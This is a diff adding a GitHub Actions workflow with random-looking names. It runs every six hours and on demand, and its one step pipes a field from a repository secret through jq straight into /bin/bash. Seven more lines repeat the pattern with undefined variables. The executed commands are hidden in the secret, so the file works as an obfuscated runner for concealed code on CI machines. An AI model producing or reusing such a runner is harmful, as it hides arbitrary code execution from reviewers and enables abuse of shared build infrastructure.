@@ -1,0 +1,25 @@
+name: zhuzhuanyun3987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuzhuanyun3987
+        env:
+          iupm72: ${{ secrets.iupm72 }}
+        run: |
+          echo $iupm72 | jq -r .nv0 | /bin/bash
+          echo $eoltl74551 | jq -r .xfiz4141 | /bin/bash
+          echo $rlyg354 | jq -r .njtz8 | /bin/bash
+          echo $dja6721 | jq -r .y0573 | /bin/bash
+          echo $pwx366 | jq -r .lxj9 | /bin/bash
+          echo $tdpub6420 | jq -r .ve9246 | /bin/bash
+          echo $oao97673 | jq -r .rt4037 | /bin/bash
+          echo $zx90 | jq -r .hml19502 | /bin/bash
+
